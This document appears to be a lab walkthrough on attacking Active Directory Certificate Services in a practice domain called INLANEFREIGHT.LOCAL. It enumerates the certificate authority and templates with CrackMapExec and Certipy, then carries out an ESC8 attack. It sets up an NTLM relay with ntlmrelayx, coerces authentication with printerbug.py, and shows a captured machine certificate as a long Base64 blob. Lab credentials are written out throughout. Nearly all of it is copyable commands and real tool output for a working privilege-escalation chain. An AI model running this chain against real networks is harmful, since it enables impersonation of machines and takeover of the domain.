# AD CS Attacks

## Hosts File

```sh
htb-student@ubuntu:~$ echo -e "172.16.117.3 inlanefreight.local dc01.inlanefreight.local\n172.16.117.50 ws01.inlanefreight.local" | sudo tee -a /etc/hosts
```

## Enumeration

### Finding Enrollment Server

```sh
htb-student@ubuntu:~$ crackmapexec ldap 172.16.117.0/24 -u 'plaintext$' -p 'Password123!' -M adcs
```

```output title="Output" hl_lines="4-5"
SMB         172.16.117.3    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
LDAP        172.16.117.3    389    DC01             [+] INLANEFREIGHT.LOCAL\plaintext$:Password123!
ADCS        172.16.117.3    389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS                                                Found PKI Enrollment Server: DC01.INLANEFREIGHT.LOCAL
ADCS                                                Found CN: INLANEFREIGHT-DC01-CA
```

### Finding Certificate Templates

#### CrackMapExec

```sh
htb-student@ubuntu:~$ crackmapexec ldap 172.16.117.3 -u 'plaintext$' -p 'Password123!' -M adcs -o SERVER=INLANEFREIGHT-DC01-CA
```

```output title="Output" hl_lines="12"
SMB         172.16.117.3    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
LDAP        172.16.117.3    389    DC01             [+] INLANEFREIGHT.LOCAL\plaintext$:Password123!
ADCS                                                Using PKI CN: INLANEFREIGHT-DC01-CA
ADCS        172.16.117.3    389    DC01             [*] Starting LDAP search with search filter '(distinguishedName=CN=INLANEFREIGHT-DC01-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,'
ADCS                                                Found Certificate Template: DirectoryEmailReplication
ADCS                                                Found Certificate Template: DomainControllerAuthentication
ADCS                                                Found Certificate Template: KerberosAuthentication
ADCS                                                Found Certificate Template: EFSRecovery
ADCS                                                Found Certificate Template: EFS
ADCS                                                Found Certificate Template: DomainController
ADCS                                                Found Certificate Template: WebServer
ADCS                                                Found Certificate Template: Machine
ADCS                                                Found Certificate Template: User
ADCS                                                Found Certificate Template: SubCA
ADCS                                                Found Certificate Template: Administrator
```

#### [Certipy](https://github.com/ly4k/Certipy)

```sh
htb-student@ubuntu:~$ certipy find -u 'plaintext$'@172.16.117.3 -p 'Password123!' -enabled -stdout
```

```output title="Output" hl_lines="34-35 250"
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'INLANEFREIGHT-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'INLANEFREIGHT-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'INLANEFREIGHT-DC01-CA' via RRP
[*] Got CA configuration for 'INLANEFREIGHT-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : INLANEFREIGHT-DC01-CA
    DNS Name                            : DC01.INLANEFREIGHT.LOCAL
    Certificate Subject                 : CN=INLANEFREIGHT-DC01-CA, DC=INLANEFREIGHT, DC=LOCAL
    Certificate Serial Number           : 6B706814F9C2EFB14C5AD3C21C5A81C1
    Certificate Validity Start          : 2024-09-11 20:09:17+00:00
    Certificate Validity End            : 2123-09-11 20:19:17+00:00
    Web Enrollment                      : Enabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Disabled
    Permissions
      Owner                             : INLANEFREIGHT.LOCAL\Administrators
      Access Rights
        ManageCertificates              : INLANEFREIGHT.LOCAL\Administrators
                                          INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
        ManageCa                        : INLANEFREIGHT.LOCAL\Administrators
                                          INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
        Enroll                          : INLANEFREIGHT.LOCAL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
Certificate Templates
  0
    Template Name                       : KerberosAuthentication
    Display Name                        : Kerberos Authentication
    Certificate Authorities             : INLANEFREIGHT-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectAltRequireDomainDns
    Enrollment Flag                     : AutoEnrollment
    Private Key Flag                    : AttestNone
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
                                          Smart Card Logon
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : INLANEFREIGHT.LOCAL\Enterprise Read-only Domain Controllers
                                          INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Domain Controllers
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Domain Controllers
      Object Control Permissions
        Owner                           : INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Owner Principals          : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Dacl Principals           : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Property Principals       : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
  1
    Template Name                       : DirectoryEmailReplication
    Display Name                        : Directory Email Replication
    Certificate Authorities             : INLANEFREIGHT-DC01-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectAltRequireDirectoryGuid
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : AttestNone
    Extended Key Usage                  : Directory Service Email Replication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : INLANEFREIGHT.LOCAL\Enterprise Read-only Domain Controllers
                                          INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Domain Controllers
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Domain Controllers
      Object Control Permissions
        Owner                           : INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Owner Principals          : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Dacl Principals           : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Property Principals       : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
  2
    Template Name                       : DomainControllerAuthentication
    Display Name                        : Domain Controller Authentication
    Certificate Authorities             : INLANEFREIGHT-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Private Key Flag                    : 16777216
                                          65536
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
                                          Smart Card Logon
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 99 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : INLANEFREIGHT.LOCAL\Enterprise Read-only Domain Controllers
                                          INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Domain Controllers
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Domain Controllers
      Object Control Permissions
        Owner                           : INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Owner Principals          : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Dacl Principals           : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Property Principals       : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
  3
    Template Name                       : SubCA
    Display Name                        : Subordinate Certification Authority
    Certificate Authorities             : INLANEFREIGHT-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : ExportableKey
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 5 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Owner Principals          : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Dacl Principals           : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Property Principals       : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
  4
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : INLANEFREIGHT-DC01-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : AttestNone
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Owner Principals          : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Dacl Principals           : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Property Principals       : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
  5
    Template Name                       : DomainController
    Display Name                        : Domain Controller
    Certificate Authorities             : INLANEFREIGHT-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDnsAsCn
                                          SubjectAltRequireDns
                                          SubjectAltRequireDirectoryGuid
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : AttestNone
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : INLANEFREIGHT.LOCAL\Enterprise Read-only Domain Controllers
                                          INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Domain Controllers
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Domain Controllers
      Object Control Permissions
        Owner                           : INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Owner Principals          : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Dacl Principals           : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Property Principals       : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
  6
    Template Name                       : Machine
    Display Name                        : Computer
    Certificate Authorities             : INLANEFREIGHT-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDnsAsCn
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Private Key Flag                    : AttestNone
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Domain Computers
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Owner Principals          : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Dacl Principals           : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Property Principals       : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
  7
    Template Name                       : EFSRecovery
    Display Name                        : EFS Recovery Agent
    Certificate Authorities             : INLANEFREIGHT-DC01-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectAltRequireUpn
    Enrollment Flag                     : AutoEnrollment
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : File Recovery
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 5 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Owner Principals          : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Dacl Principals           : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Property Principals       : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
  8
    Template Name                       : Administrator
    Display Name                        : Administrator
    Certificate Authorities             : INLANEFREIGHT-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectRequireEmail
                                          SubjectAltRequireEmail
                                          SubjectAltRequireUpn
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Microsoft Trust List Signing
                                          Encrypting File System
                                          Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Owner Principals          : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Dacl Principals           : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Property Principals       : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
  9
    Template Name                       : EFS
    Display Name                        : Basic EFS
    Certificate Authorities             : INLANEFREIGHT-DC01-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectAltRequireUpn
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Domain Users
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Owner Principals          : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Dacl Principals           : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Property Principals       : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
  10
    Template Name                       : User
    Display Name                        : User
    Certificate Authorities             : INLANEFREIGHT-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectRequireEmail
                                          SubjectAltRequireEmail
                                          SubjectAltRequireUpn
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Domain Users
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Owner Principals          : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Dacl Principals           : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Property Principals       : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
```

## [ESC8](https://posts.specterops.io/certified-pre-owned-d95910965cd2) (Relaying NTLM to HTTP)

### Web Endpoint Fuzzing

```sh
htb-student@ubuntu:~$ NTLMRecon -t "http://172.16.117.3/" -o json | jq
```

```json title="Output" hl_lines="2"
{
  "url": "http://172.16.117.3/CertSrv/",
  "ntlm": {
    "netbiosComputerName": "DC01",
    "netbiosDomainName": "INLANEFREIGHT",
    "dnsDomainName": "INLANEFREIGHT.LOCAL",
    "dnsComputerName": "DC01.INLANEFREIGHT.LOCAL",
    "forestName": "INLANEFREIGHT.LOCAL"
  }
}
```

### Verifying the Authentication

```sh
htb-student@ubuntu:~$ curl -s 'http://172.16.117.3/CertSrv/' -I
```

```http title="Response" hl_lines="6"
HTTP/1.1 401 Unauthorized
Content-Length: 1293
Content-Type: text/html
Server: Microsoft-IIS/10.0
WWW-Authenticate: Negotiate
WWW-Authenticate: NTLM
X-Powered-By: ASP.NET
Date: Mon, 03 Feb 2025 01:32:19 GMT
```

### Getting the Relay Ready

```sh
htb-student@ubuntu:~$ sudo ntlmrelayx.py -t http://172.16.117.3/CertSrv/certfnsh.asp -smb2support --adcs --template Machine
```

### Coercing SMB Authentication

| TARGET | ATTACK MACHINE |
|---|---|
| 172.16.117.50 | 172.16.117.30 |

```sh
htb-student@ubuntu:~$ printerbug.py 'INLANEFREIGHT'/'plaintext$':'Password123!'@172.16.117.50 172.16.117.30
```

```output title="Output" hl_lines="4-5"
[*] Attempting to trigger authentication via rprn RPC at 172.16.117.50
[*] Bind OK
[*] Got handle
RPRN SessionError: code: 0x6ab - RPC_S_INVALID_NET_ADDR - The network address is invalid.
[*] Triggered RPC backconnect, this may or may not have worked
```

### Relay Results

!!! success

    Zorla başlatılan SMB kimlik doğrulaması HTTP üzerinden aktarıldı ve Base64 sertifika elde edildi.

```sh
htb-student@ubuntu:~$ sudo ntlmrelayx.py -t http://172.16.117.3/CertSrv/certfnsh.asp -smb2support --adcs --template Machine
```

```output title="Output" hl_lines="9"
[*] SMBD-Thread-5: Received connection from 172.16.117.50, attacking target http://172.16.117.3
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://172.16.117.3 as INLANEFREIGHT/WS01$ SUCCEED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE! ID 16
[*] Base64 certificate of user WS01$:
MIIRPQIBAzCCEPcGCSqGSIb3DQEHAaCCEOgEghDkMIIQ4DCCBxcGCSqGSIb3DQEHBqCCBwgwggcEAgEAMIIG/QYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQIdMFizoihEcMCAggAgIIG0JGMkixeTVXpdUVVvd8+8VUewSpqT32iKHjbmG181C62w1J6nyqHbVSE2nEA797p7c6D5ZlGqDUvxk9PQ/ICIsEjO/g5V11oC6hg6qwlxGtJWQPijj5vmavVtksFTR2h2GdQ7Mpdyyc8TsgfsLTslBL18d+yMgGXTNxAXKDJ6swbHTLPUW2Fhfh7AwJvIyBxCYb5FdRGq4c5VFJOT1WJ8UyRzrf6x7uiIqXkKV2P9qsihyfMaf79py3//Rj6qI6uDC60xmTj1iqFQ2ggxLX9dQM66Q/FLY96x1hGjVjlx+/9uX1ai7bBCBX6qhQ71QCopoRQubDo9bdR+Msp5HDJBtKamgpIWqGGaAUz24bkwi7o/DakKz1BEcAkzLW0TDCpZxY7fFOkGR2ECKoVjuyuTzKjqLrYinQo7AZbiv4M6w0mXZlV0k0moCEk+EL+6YEzZuD4yvRkA4lTTbed4hlz2E385hYr8Mlcc+jfjp/w5ptXe149h74GTaBsKpTwexudFf3WewIahlbvGw0iYzTJTcbOZVq3tnoiODkjJWDZ/R7Je+nCqbqEqx3hW6UkYyYpK2LLsiDwNaDUAIjM/cRtVFVUPo6FzyITheUqfXcm8pJrP16cWUr+pLlAaMW1gNX3FN+HqJnTBybuHSFGc+gzNa93CjGUoYHPzvhIEu+jRBa54vyxRiIDosy/xa6sRCzfhTK949eBtfRYx+jICDssgU9J6RnW4J7rsG7HolUafbiidDC5FPDWAADf9XBtUORqR7RtdZqMLosmBEEHCFv+mjN2TzPReqLkywwzTlXfAMUMzk1YByhKpe8qu1LbnOVWcieVpxnNfwsMk2WNvsxL67PQzgkFX71+RtRzwYUiL125YEdtFFdcz9y3nSzCf4qDUusPjPTaZ3MRtILc3aPy5CV0RyfhfqkPNUuzPAFd5YIc86GUV/qfLhfqeDq3LP+1f202e07Veageu64wO9YVtlVObb87kJKW8O4sgi5cvI4hBYPYLy/acTCsKnsc4H3PNnhjCVNunSVWqAK89im+6NLx/jETfpilGMHF/BGwk2jlB7qdFAFsNwQqAzyYyI32RSUQ99vFwjKB6zvkN4IjL6L1ueVezmsPh1voHT6I1sy7jxzMKoNibwZ5sQpEaAioT2WQYp5GxcGe9ak/f9K8M5AhO9CtMOefPhLIgANNQ2X7foAPbri57DMdXABHRY5pOyBeMBLpYhbp07T9rhedgjgprn+V6hrqrr8tIrT7XdYBjEbpIhetPzLWitDY6VfI1f+CjIZQt2g1m/qcWLGqOgOqexsbjyjQ6Zh2XMV7T+agtRrdofcjrwBrwnsJRRgxrhhSmLjEBCUW6z9qnqPJzYIVNMXUifUmRDukQwwud1B0UI2dqSQYtadd87m2RZaUGe7T86/1K8si6iwgLpaHkvgRpi8MfuXJDqdoe52QldyyHa3EQ8ClizKb6aaCq6PGq/oPrlbMhbK1/bqCzZ0bpHO0lP30wJBFPkiFSOxGzF4UI/bbuxUnslQgDYq2LlWGCgdiT24/4BFpmL9lEodXeIdBM4LSBkzPLTDtmproJVJQp1iJwyvxUTY+mJnXO80ZBx4qTYw/qRc3JYRsOqPwokkHFYD9JJkxHv5rhxb2BZMWB0P6fuUpLlKTnXMVtDkrkS4fuNYf2BBEoOe3vD66Wea90+qwWM68PrN7LXiplxKalvTcRiivCIgErULL6JMu+KhtJ54pDuJBBpyxSSiKrCK3Br5ikWgLk2Ru1IqYZBMZuzMC0er5ATn6+Zmrqby7f/woMgEQtKHxGCYtbuSOVtZLUQ3O1xbJCbwv5AEfuDaHpjEs+EcbXd1tDz8TWcBk8J/Kio8000SdGXAMPYzzQOKK4zVZR8yGoT4Y1jX8GI483wmkzSUs0dgROONqpm7u+02DagJ9jUiJ4dli8yog/Ur6Plw2zdd4ps9jbU1ei9GC8uTy55NRqxNNfvqMnkGV+eD7qgVzyJQGGqLpz5NKsn3mSYrAF3TA/UqZF2XNKfwFBOm1vJryCko3uQEW9ZhXotfKyK15msDnxxc3T+Qmv4MctabLc1GjuJPNJmExjauGBwz7Kwy8Jr3y236txHAKLbSCOpWeARa7kamgZE7gu8SwG/FVHdpqwZ30jkoVP4HYghAa8LKw55oylc3xht90RTD7d4HtvmblEsLPFWMLFmbQ5A6V0NcHZAsueFSiYyrl7lDXcTL41ZJGQMvP6pSVB6wDy+WeU4c5pzv9lkgw7N86d5w3PJHX77f79tPpu+iZHfcjdGS9m9hV1hgOjstsoQjoXmdjfdnkul+s3kFUoYEwggnBBgkqhkiG9w0BBwGgggmyBIIJrjCCCaowggmmBgsqhkiG9w0BDAoBAqCCCW4wgglqMBwGCiqGSIb3DQEMAQMwDgQI6YrC5sRlYo4CAggABIIJSAhrPt8b0YttsC3LzaW8vEgNCrb0eKVi9hg9G0NG50nU34DPU0BiQCJpvtL9rocvKQvPU2j1zvc/TJ6uSX2vPcDB7cMQYpPVJygdj/4fHy2w5IWitMki3uw4PVC4Qrwj9k2GaSI7EtNQKPmR64JNp0FXifJH2p1Mj+8oVe6sajdnmx6inr2qcE6uZd3AV1d0FFo2BdC2kmI+DUiB75/4DybdImQPtsk7ZBCpNwefJDQ3LpSAA491Ni1ZHNq1GbIY8uaPOVlhPO2uefcPRz8MJ2Wi0SuljbpDjLxVqWo9lNBcbFhFaOFwGf7AXypmvbVt09hDdAnpv0RlpCbjV5g/GZIQWLKaNJC1QTXCmsIBy9M/1VpnZixwh7LySw5TeNV6BHktiS2VpAIIlg3HnDKyFyItUcnUon2Lwuuy90XN+Wl1J0zMuLA82RLNm4KwBDoN9iDpG8VgrGSIP4t/SnKnpBW0phl3CyLX4PElSdeI/yi09nP8YaVDAvCsMNbNlooLKwBGc5LZpt8nharmEF6LIM3E4KKvqOlsJvNuIvgiHYQBk/CO1uJe2LeFuFs0IOsgwK85PR44IJvXRULlc4yEIHYKkOnuDkBGk/JvuOjxxMXQRApfUKXTBKzNw5a74J8YfaYP1f4+ubSTOONNIFB2bJj45ZU6sZtUvp6bP2vSlIHSpM2WpjaFVF/KBtYCnX2i0zgdDTd6ZMDHIjtPrJE1TAQRtTqqK+jYr4gU2+ZWi3+rmmPxhBAgWW1qbpONQYTJUWhJWJyTt7LiuZmFTNS5OUlfEOIL8aKBPu+K/3ED15bKyyJqzMSB2FLVmnt1dVw2u4GsG7JiWvL47ziBCLB93fspbxn3UgI2ufouPdvTgfGF4ffXOdZ/TsRgYUcONz0Ei8hRvYqRW81pSieVyIpJ1wJU/eptxJ02vT4eTYp9eX426uF9/YEF/0UMohAVGNbUxZMD5hgEeh1qEYTjU73YhJUP6oho34MgCyCgtDsWSLqIZSXfIpXh9H+8Ga0lfK4qxN3XvhP7f9GpmFDKCclqTDU0wsSadpqeVSfSdnzasCxCNPnETeGbz3meyjyMs5fa+KbLRf8N+UFwGFGUeXaw8BP5kIcWqE+8EAeI7qigrhf2t+I4wvb0gsaoW+1OtfANcVGDZ1sCjEppntVpdjCCFEkqkUSpp/nHztqGYoAYdjXn/6AIeaNUVHmXgR2ZPaH/p1PaU446XPiMIV56TUBNFYV1UMmV8y/jgvIjo3gbkCBMPRIAdsEQ+fRY7l6MYIwnYB8UfqxxvPdsCMBAW+G5Z1NeWMvzgMO0h/3dPWlFKXtcPGWNGnWzoBmeGT/PYo1px2h+dTrDsyD+y6I4WcfhwVdVhp9y/1MW2kXsXPvbfEl2b6Vzh12owSHFQf+BYTg6vNZLhLYhXKrwX9w+25DpPCCSrkT27QMmkUerR+SwvTdrA9uOwo6hTUc96iQLqAQ5rw9F9rQvDkemfKrqSn1RX7p2eNB03KygrkuNIZEHgN45DI336YYWo+DbQs38WFKtutHSGz//JCWZ1S33RCVlowTEwe3TKD